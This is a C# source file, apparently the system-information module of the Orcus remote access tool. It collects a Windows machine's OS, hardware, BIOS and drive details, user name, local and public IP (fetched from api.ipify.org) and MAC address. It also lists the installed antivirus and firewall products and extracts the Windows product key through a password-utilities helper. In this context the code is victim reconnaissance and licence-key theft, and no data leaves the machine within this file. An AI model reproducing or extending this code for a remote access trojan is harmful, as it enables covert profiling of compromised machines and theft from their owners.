using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Utilities;
using Screen = Orcus.Shared.Commands.ComputerInformation.Screen;
#if NET35
using Orcus.Extensions;
#endif

// ReSharper disable AccessToDisposedClosure
// ReSharper disable PossibleNullReferenceException
// ReSharper disable CompareOfFloatsByEqualityOperator

namespace Orcus.Commands.ComputerInformation
{
    internal static class InformationCollector
    {
        public static Shared.Commands.ComputerInformation.ComputerInformation GetInformation()
        {
            var sw = Stopwatch.StartNew();
            var result = new Shared.Commands.ComputerInformation.ComputerInformation
            {
                SystemInformation = GetOperatingSystemInformation(),
                HardwareInformation = GetHardwareInformation(),
                NetworkInformation = GetNetworkInformation(),
                BiosInformation = GetBiosInformation(),
                SoftwareInformation = GetSoftwareInformation(),
                LogicalDrives = GetLogicalDrives(),
                ProcessTime = (int) sw.ElapsedMilliseconds,
                Timestamp = DateTime.UtcNow
            };

            return result;
        }

        private static List<LogicalDrive> GetLogicalDrives()
        {
            return DriveInfo.GetDrives().Select(x => x.IsReady
                ? new LogicalDrive
                {
                    Name = x.Name,
                    AvailableFreeSpace = x.AvailableFreeSpace,
                    DriveFormat = x.DriveFormat,
                    DriveType = x.DriveType.ToString(),
                    IsReady = true,
                    RootDirectory = x.RootDirectory.FullName,
                    TotalSize = x.TotalSize,
                    VolumeLabel = x.VolumeLabel
                }
                : new LogicalDrive
                {
                    IsReady = false,
                    Name = x.Name,
                    DriveType = x.DriveType.ToString()
                }).ToList();
        }

        private static OperatingSystemInformation GetOperatingSystemInformation()
        {
            var result = new OperatingSystemInformation
            {
                NtVersion = Environment.OSVersion.ToString(),
                Platform = Environment.OSVersion.Platform.ToString(),
                SystemDirectory = Environment.SystemDirectory,
                ClrVersion = Environment.Version.ToString(),
                UserName = Environment.UserName,
                UserDomainName = Environment.UserDomainName,
#if NET35
                SystemPageSize = EnvironmentExtensions.SystemPageSize
#else
                SystemPageSize = Environment.SystemPageSize
#endif
            };

            switch (SystemInformation.BootMode)
            {
                case BootMode.Normal:
                    result.BootMode = "Normal";
                    break;
                case BootMode.FailSafe:
                    result.BootMode = "Safe mode without network support";
                    break;
                case BootMode.FailSafeWithNetwork:
                    result.BootMode = "Safe mode with network support";
                    break;
                default:
                    result.BootMode = "N/A";
                    break;
            }

            using (
                var regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                    RegistryKeyPermissionCheck.ReadSubTree))
            {
                result.FriendlyName = SetValue(() => (string) regKey.GetValue("ProductName"));

                try
                {
                    if (result.FriendlyName.StartsWith("Windows 10"))
                    {
                        int build = int.Parse(regKey.GetValue("CurrentBuild").ToString());
                        if (build < 10586)
                        {
                            result.Version = regKey.GetValue("CurrentMajorVersionNumber") + "." +
                                             regKey.GetValue("CurrentMinorVersionNumber") + " [Build " + build + "]";
                        }
                        else
                        {
                            result.Version = regKey.GetValue("ReleaseId") + " [Build " + build + "." +
                                             regKey.GetValue("UBR") + "]";
                        }
                    }
                    else
                    {
                        result.Version = regKey.GetValue("CurrentVersion") + " [Build " +
                                         regKey.GetValue("CurrentBuild") + "]";
                    }
                }
                catch (Exception)
                {
                    result.Version = "N/A";
                }

                var match = Regex.Match(result.Version, @"^[0-9](\.[0-9]{1,3})?");
                if (match.Success)
                {
                    var version = double.Parse(match.Value, CultureInfo.InvariantCulture);
                    if (version == 5.1)
                    {
                        result.InternalName = "Whistler";
                    }
                    else if (version == 5.2)
                    {
                        result.InternalName = "Whistler Server";
                    }
                    else if (version == 6.0)
                    {
                        if (result.Version.Contains("Vista"))
                        {
                            result.InternalName = "Longhorn";
                        }
                        else if (result.Version.Contains("2008"))
                        {
                            result.InternalName = "Longhorn Server";
                        }
                    }
                    else if (version == 6.1)
                    {
                        result.InternalName = "Blackcomb, Vienna";
                    }
                    else if (version == 6.2 || version == 6.3)
                    {
                        result.InternalName = "Mystic, Orient";
                    }
                    else if (version == 6.4 || version == 10.0 || result.FriendlyName.StartsWith("Windows 10"))
                    {
                        result.InternalName = "Threshold";
                    }
                }

                if (string.IsNullOrEmpty(result.InternalName))
                    result.InternalName = "N/A";
            }

            using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem"))
            using (var computerSystemManagmentObject = searcher.Get().OfType<ManagementObject>().FirstOrDefault())
            {
                result.Architecture = SetValue(() => (string) computerSystemManagmentObject["SystemType"]);
                result.AdminPasswordStatus = SetValue(() => AdminPasswordStatusToString(
                    int.Parse(computerSystemManagmentObject["AdminPasswordStatus"].ToString())));
                result.Workgroup = SetValue(() => (string) computerSystemManagmentObject["Workgroup"]);
                result.Manufacturer = SetValue(() => (string) computerSystemManagmentObject["Manufacturer"]);
                result.Model = SetValue(() => (string) computerSystemManagmentObject["Model"]);
                result.Owner = SetValue(() => (string) computerSystemManagmentObject["PrimaryOwnerName"]);
                result.TotalPhysicalMemory = SetValue(
                    () => (ulong) computerSystemManagmentObject["TotalPhysicalMemory"], ulong.MinValue);
            }

            result.ProductKey = SetValue(KeyDecoder.GetWindowsProductKey);

            return result;
        }

        private static BiosInformation GetBiosInformation()
        {
            var result = new BiosInformation();
            using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS"))
            using (var biosManagmentObject = searcher.Get().OfType<ManagementObject>().FirstOrDefault())
            {
                result.Name = SetValue(() => (string) biosManagmentObject["Name"]);
                result.Version = SetValue(() => (string) biosManagmentObject["Version"]);
                result.ProductId = SetValue(() => (string) biosManagmentObject["SerialNumber"]);
                result.Manufacturer = SetValue(() => (string) biosManagmentObject["Manufacturer"]);
                result.ReleaseDate =
                    SetValue(() => ManagementDateTimeConverter.ToDateTime((string) biosManagmentObject["ReleaseDate"]),
                        DateTime.MinValue);
                result.Language = SetValue(() => (string) biosManagmentObject["CurrentLanguage"]);
                result.SupportedLanguages =
                    SetValue(
                        () =>
                            ((string[]) biosManagmentObject["ListOfLanguages"]).Aggregate(new StringBuilder(),
                                (builder, s) => builder.Append(s + ", ")).ToString().TrimEnd(' ', ','));
            }

            return result;
        }

        private static HardwareInformation GetHardwareInformation()
        {
            var result = new HardwareInformation
            {
                Screens = System.Windows.Forms.Screen.AllScreens.Select(x => new Screen
                {
                    IsPrimary = x.Primary,
                    Resolution = $"{x.Bounds.Width} x {x.Bounds.Height}",
                    BitsPerPixel = x.BitsPerPixel,
                    DeviceName = x.DeviceName
                }).ToList()
            };

            ProcessorInfo processorInfo;
            result.ProcessorInfo = processorInfo = new ProcessorInfo
            {
                LogicalProcessors = Environment.ProcessorCount,
                ClockSpeed = SetValue(() =>
                {
                    using (var regKey =
                        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                            RegistryKeyPermissionCheck.ReadSubTree))
                    {
                        var clockSpeedMhz = regKey.GetValue("~MHz").ToString();
                        return Math.Round(Convert.ToDecimal(clockSpeedMhz)/1000) + " GHz (" +
                               clockSpeedMhz + " MHz)";
                    }
                }),
                ManufactureId = SetValue(() =>
                {
                    using (var regKey =
                        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                            RegistryKeyPermissionCheck.ReadSubTree))
                        return regKey.GetValue("VendorIdentifier").ToString();
                })
            };

            try
            {
                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor"))
                using (var processorManagementObject = searcher.Get().OfType<ManagementObject>().FirstOrDefault())
                {
                    if (processorManagementObject != null)
                    {
                        processorInfo.Name = SetValue(() => processorManagementObject["Name"].ToString());
                        processorInfo.Description =
                            SetValue(() => processorManagementObject["Description"].ToString());
                        processorInfo.Cores = SetValue(() => (uint) processorManagementObject["NumberOfCores"],
                            uint.MinValue);
                        processorInfo.Architecture =
                            SetValue(
                                () =>
                                    ArchitectureToString(int.Parse(processorManagementObject["Architecture"].ToString())));
                        processorInfo.L2CacheSize = SetValue(() => processorManagementObject["L2CacheSize"] + "KiB");
                        processorInfo.L3CacheSize = SetValue(() => processorManagementObject["L3CacheSize"] + "KiB");
                        processorInfo.DeviceId = SetValue(() => processorManagementObject["DeviceID"].ToString());
                        processorInfo.ProcessorId = SetValue(() => processorManagementObject["ProcessorId"].ToString());
                        processorInfo.ProcessorType = SetValue(() =>
                            ProcessorTypeToString(
                                int.Parse(processorManagementObject["ProcessorType"].ToString())));
                        processorInfo.ExternalClockSpeed = SetValue(() => processorManagementObject["ExtClock"] + "MHz");
                        processorInfo.Revision =
                            SetValue(() => int.Parse(processorManagementObject["Revision"].ToString()), 0);
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController")
                    )
                {
                    var videoCardManagementObject = searcher.Get().OfType<ManagementObject>().FirstOrDefault();
                    if (videoCardManagementObject != null)
                        result.VideoCardInfo = new VideoCardInfo
                        {
                            MaxRefreshRate = int.Parse(videoCardManagementObject["MaxRefreshRate"].ToString()),
                            DeviceId = videoCardManagementObject["DeviceID"].ToString(),
                            Name = videoCardManagementObject["Caption"].ToString(),
                            VideoArchitecture =
                                VideoArchitectureToString(
                                    int.Parse(videoCardManagementObject["VideoArchitecture"].ToString())),
                            VideoMemoryType =
                                VideoMemoryTypeToString(
                                    int.Parse(videoCardManagementObject["VideoMemoryType"].ToString())),
                            VideoModeDescription = videoCardManagementObject["VideoModeDescription"].ToString(),
                            VideoProcessor = videoCardManagementObject["VideoProcessor"].ToString()
                        };
                }
            }
            catch (Exception)
            {
                result.VideoCardInfo = new VideoCardInfo
                {
                    MaxRefreshRate = -1,
                    DeviceId = "N/A",
                    Name = "N/A",
                    VideoArchitecture = "N/A",
                    VideoMemoryType = "N/A",
                    VideoModeDescription = "N/A",
                    VideoProcessor = "N/A"
                };
            }

            return result;
        }

        private static T SetValue<T>(GetValue<T> action, T defaultValue)
        {
            try
            {
                return action.Invoke();
            }
            catch (Exception)
            {
                return defaultValue;
            }
        }

        private static string SetValue(GetValue<string> action)
        {
            var result = SetValue(action, "N/A");
            return string.IsNullOrEmpty(result) ? "N/A" : result;
        }

        private static NetworkInformation GetNetworkInformation()
        {
            var result = new NetworkInformation
            {
                IpAddresses =
                    Dns.GetHostEntry(Dns.GetHostName())
                        .AddressList.Select(x => new IpAddress {AddressFamily = x.AddressFamily, Value = x.ToString()})
                        .ToList()
            };

            using (var wc = new WebClient {Proxy = null})
            {
                try
                {
                    result.PublicIp = wc.DownloadString("https://api.ipify.org/");
                }
                catch (WebException)
                {
                    result.PublicIp = "N/A";
                }
            }

            result.MacAddress = "N/A";
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        foundCorrect = ip.Address.ToString() == GetLanIp();
                    }

                    if (foundCorrect)
                    {
                        var macAddress = ni.GetPhysicalAddress().ToString();
                        result.MacAddress = macAddress.Length != 12
                            ? "00:00:00:00:00:00"
                            : Regex.Replace(macAddress, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6");
                        break;
                    }
                }
            }

            return result;
        }

        private static SoftwareInformation GetSoftwareInformation()
        {
            var result = new SoftwareInformation();

            try
            {
                string[] antivirusPrograms;
                using (
                    var searcher =
                        new ManagementObjectSearcher(CoreHelper.RunningOnVistaOrGreater ? "root\\SecurityCenter2" : "root\\SecurityCenter",
                            "SELECT * FROM AntivirusProduct"))
                {
                    antivirusPrograms =
                        searcher.Get()
                            .OfType<ManagementObject>()
                            .Select(mObject => mObject["displayName"].ToString())
                            .ToArray();
                }

                result.AntiVirusPrograms = antivirusPrograms.Length > 0
                    ? string.Join(", ", antivirusPrograms.ToArray())
                    : "N/A";
            }
            catch
            {
                result.AntiVirusPrograms = "Unknown";
            }

            try
            {
                string[] firewalls;
                using (
                    var searcher =
                        new ManagementObjectSearcher(CoreHelper.RunningOnVistaOrGreater ? "root\\SecurityCenter2" : "root\\SecurityCenter",
                            "SELECT * FROM FirewallProduct"))
                {
                    firewalls =
                        searcher.Get()
                            .OfType<ManagementObject>()
                            .Select(mObject => mObject["displayName"].ToString())
                            .ToArray();
                }

                result.Firewalls = firewalls.Length > 0 ? string.Join(", ", firewalls) : "N/A";
            }
            catch
            {
                result.Firewalls = "Unknown";
            }

            try
            {
                using (
                    var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"))
                    result.InstalledPrograms = key?.GetSubKeyNames().Length ?? -1;
            }
            catch (Exception)
            {
                result.InstalledPrograms = -1;
            }


            return result;
        }

        private static string ArchitectureToString(int value)
        {
            switch (value)
            {
                case 0:
                    return "x86";
                case 1:
                    return "MIPS";
                case 2:
                    return "Alpha";
                case 3:
                    return "PowerPC";
                case 5:
                    return "ARM";
                case 6:
                    return "Itanium-based systems";
                case 9:
                    return "x64";
                default:
                    return string.Empty;
            }
        }

        private static string AdminPasswordStatusToString(int status)
        {
            switch (status)
            {
                case 1:
                    return "Disabled";
                case 2:
                    return "Enabled";
                case 3:
                    return "Not Implemented";
                default:
                    return "Unknown";
            }
        }

        private static string ProcessorTypeToString(int type)
        {
            switch (type)
            {
                case 1:
                    return "Other";
                case 2:
                    return "Unknown";
                case 3:
                    return "Central Processor";
                case 4:
                    return "Math Processor";
                case 5:
                    return "DSP Processor";
                case 6:
                    return "Video Processor";
                default:
                    return string.Empty;
            }
        }

        //https://msdn.microsoft.com/en-us/library/aa394512(v=vs.85).aspx
        private static string VideoArchitectureToString(int type)
        {
            switch (type)
            {
                case 1:
                    return "Other";
                default:
                    return "Unknown";
                case 3:
                    return "CGA";
                case 4:
                    return "EGA";
                case 5:
                    return "VGA";
                case 6:
                    return "SVGA";
                case 7:
                    return "MDA";
                case 8:
                    return "HGC";
                case 9:
                    return "MCGA";
                case 10:
                    return "8514A";
                case 11:
                    return "XGA";
                case 12:
                    return "Linear Frame Buffer";
                case 160:
                    return "PC-98";
            }
        }

        private static string VideoMemoryTypeToString(int type)
        {
            switch (type)
            {
                case 1:
                    return "Other";
                default:
                    return "Unknown";
                case 3:
                    return "VRAM";
                case 4:
                    return "DRAM";
                case 5:
                    return "SRAM";
                case 6:
                    return "WRAM";
                case 7:
                    return "EDO RAM";
                case 8:
                    return "Burst Synchronous DRAM";
                case 9:
                    return "Pipelined Burst SRAM";
                case 10:
                    return "CDRAM";
                case 11:
                    return "3DRAM";
                case 12:
                    return "SDRAM";
                case 13:
                    return "SGRAM";
            }
        }

        private static string GetLanIp()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        return ip.Address.ToString();
                    }
                }
            }

            return "-";
        }

        private delegate T GetValue<out T>();
    }
}